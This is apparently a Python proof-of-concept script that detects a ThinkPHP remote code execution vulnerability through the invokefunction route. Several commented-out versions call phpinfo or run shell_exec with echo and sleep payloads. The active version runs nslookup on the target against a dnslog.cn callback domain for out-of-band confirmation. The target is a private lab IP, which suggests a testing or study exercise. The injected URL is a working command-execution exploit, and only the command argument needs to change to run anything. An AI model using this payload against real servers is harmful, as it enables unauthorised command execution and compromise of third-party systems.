import requests
import random
import string
import hashlib
import time


# def verify(url):
#     path = r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
#     vul_url = url + path

#     response = requests.get(vul_url)
#     if response.status_code == 200 and 'PHP Version' in response.text:
#         print('Vulnerable')
#     else:
#         print('Not vulnerable')


# def verify(url):
#     random_str = ''.join([random.choice(string.ascii_letters) for _ in range(6)])
#     str_hash = hashlib.md5(random_str.encode()).hexdigest()
#     path = r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=echo%20'
#     vul_url = url + path + str_hash

#     response = requests.get(vul_url)
#     if response.status_code == 200 and str_hash in response.text:
#         print('Vulnerable')
#     else:
#         print('Not Vulnerable')


# def verify(url):
#     random_str = ''.join([random.choice(string.ascii_letters) for _ in range(6)])
#     str_hash = hashlib.md5(random_str.encode()).hexdigest()
#     path = r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=echo%20'
#     vul_url = url + path + str_hash

#     response = requests.get(vul_url)
#     if response.status_code == 200 and str_hash+'\n' == response.text:  # 因为 echo 命令输出默认会在末尾加一个换行符，所以判断 str_hash+'\n'，而不仅仅是 str_hash。
#         print('Vulnerable')
#     else:
#         print('Not Vulnerable')


# def verify(url):
#     path = r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=sleep%205'
#     vul_url = url + path

#     start_time = time.time()
#     response = requests.get(vul_url)
#     end_time = time.time()
#     spent_time = end_time - start_time
#     print(spent_time)

#     if spent_time > 5:
#         print('Vulnerable')
#     else:
#         print('Not Vulnerable')


def verify(url):
    session = requests.Session()
    domain = session.get('http://www.dnslog.cn/getdomain.php').text

    path = r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=nslookup%20'
    vul_url = url + path + domain
    response = requests.get(vul_url)
    records = session.get('http://www.dnslog.cn/getrecords.php').text

    if domain in records:
        print('Vulnerable')
    else:
        print('Not Vulnerable')


if __name__ == "__main__":
    import sys
    #verify(sys.argv[1])
    verify('http://10.10.11.20:63069')
